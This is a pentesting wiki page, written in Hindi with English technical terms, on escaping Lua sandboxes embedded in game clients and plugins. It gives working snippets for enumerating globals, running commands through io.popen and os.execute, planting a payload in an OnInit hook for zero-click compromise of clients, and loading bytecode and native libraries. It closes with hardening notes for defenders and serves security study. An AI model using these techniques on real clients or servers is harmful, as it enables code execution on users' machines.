# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

यह पेज applications में embedded Lua "sandboxes" (विशेष रूप से game clients, plugins या in-app scripting engines) को enumerate करने और उनसे breakout करने की practical techniques एकत्र करता है। कई engines एक restricted Lua environment expose करते हैं, लेकिन powerful globals को reachable छोड़ देते हैं, जिससे arbitrary command execution या bytecode loaders expose होने पर native memory corruption तक संभव हो सकता है।

मुख्य विचार:
- VM को एक अज्ञात environment की तरह समझें: _G को enumerate करें और पता लगाएं कि कौन से dangerous primitives reachable हैं।
- जब stdout/print blocked हो, तो results देखने के लिए किसी भी in-VM UI/IPC channel को output sink के रूप में abuse करें।
- यदि io/os exposed है, तो आपके पास अक्सर direct command execution होता है (io.popen, os.execute)।
- यदि load/loadstring/loadfile exposed हैं, तो crafted Lua bytecode execute करने से कुछ versions में memory safety subvert की जा सकती है (≤5.1 verifiers को bypass किया जा सकता है; 5.2 में verifier हटा दिया गया), जिससे advanced exploitation संभव होता है।

## Sandboxed environment को enumerate करें

- Reachable tables/functions की inventory बनाने के लिए global environment को dump करें:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- यदि print() उपलब्ध नहीं है, तो in-VM channels का पुनः उपयोग करें। MMO housing script VM के उदाहरण में chat output केवल sound call के बाद काम करता है; निम्नलिखित एक विश्वसनीय output function बनाता है:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
अपने target के लिए इस pattern को generalize करें: कोई भी textbox, toast, logger या UI callback जो strings स्वीकार करता है, reconnaissance के लिए stdout के रूप में काम कर सकता है।

## यदि io/os exposed है तो direct command execution

यदि sandbox अभी भी standard libraries io या os को expose करता है, तो संभवतः आपको तुरंत command execution मिल जाता है:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
नोट्स:

- Execution client process के अंदर होता है; external debuggers को block करने वाली कई anti-cheat/antidebug layers in-VM process creation को नहीं रोकेंगी।
- यह भी जाँचें: package.loadlib (arbitrary DLL/.so loading), native modules के साथ require, LuaJIT का ffi (यदि मौजूद हो), और debug library (जो VM के अंदर privileges बढ़ा सकती है)।

## auto-run callbacks के ज़रिए Zero-click triggers

यदि host application clients को scripts push करता है और VM auto-run hooks (जैसे OnInit/OnLoad/OnEnter) expose करता है, तो script load होते ही drive-by compromise के लिए अपना payload वहाँ रखें:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
कोई भी equivalent callback (OnLoad, OnEnter, आदि) इस technique को generalize करता है, जब scripts client पर automatically transmit और execute की जाती हैं।

## Recon के दौरान खोजे जाने वाले Dangerous primitives

_G enumeration के दौरान, विशेष रूप से इनकी तलाश करें:
- io, os: io.popen, os.execute, file I/O, env access।
- load, loadstring, loadfile, dofile: source या bytecode execute करते हैं; untrusted bytecode को load करने का समर्थन करते हैं।
- package, package.loadlib, require: dynamic library loading और module surface।
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, और hooks।
- केवल LuaJIT: native code को सीधे call करने के लिए ffi.cdef, ffi.load।

Minimal usage examples (यदि reachable हों):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## वैकल्पिक escalation: Lua bytecode loaders का दुरुपयोग

जब load/loadstring/loadfile reachable हों लेकिन io/os restricted हों, तब crafted Lua bytecode का execution memory disclosure और corruption primitives तक ले जा सकता है। मुख्य तथ्य:
- Lua ≤ 5.1 में ऐसा bytecode verifier शामिल था जिसमें ज्ञात bypasses मौजूद हैं।<sup>[[4]](#references)</sup>
- Lua 5.2 ने verifier को पूरी तरह हटा दिया (official stance: applications को केवल precompiled chunks reject करने चाहिए), जिससे bytecode loading prohibited न होने पर attack surface बढ़ गया।<sup>[[2]](#references)[[3]](#references)</sup>
- Workflows आमतौर पर: in-VM output के माध्यम से pointers leak करना, type confusions बनाने के लिए bytecode craft करना (जैसे FORLOOP या अन्य opcodes के आसपास), फिर arbitrary read/write या native code execution तक pivot करना।<sup>[[2]](#references)[[4]](#references)</sup>

यह path engine/version-specific है और RE की आवश्यकता होती है। गहन विश्लेषण, exploitation primitives और games में example gadgetry के लिए references देखें।

## Detection और hardening notes (defenders के लिए)

- Server side: user scripts को reject या rewrite करें; safe APIs को allowlist करें; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi को strip या bind-empty करें।
- Client side: Lua को minimal _ENV के साथ चलाएँ, bytecode loading को forbid करें, strict bytecode verifier या signature checks को फिर से लागू करें, और client process से process creation को block करें।
- Telemetry: script load के तुरंत बाद gameclient → child process creation पर alert करें; इन्हें UI/chat/script events के साथ correlate करें।

## References

- [1] [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
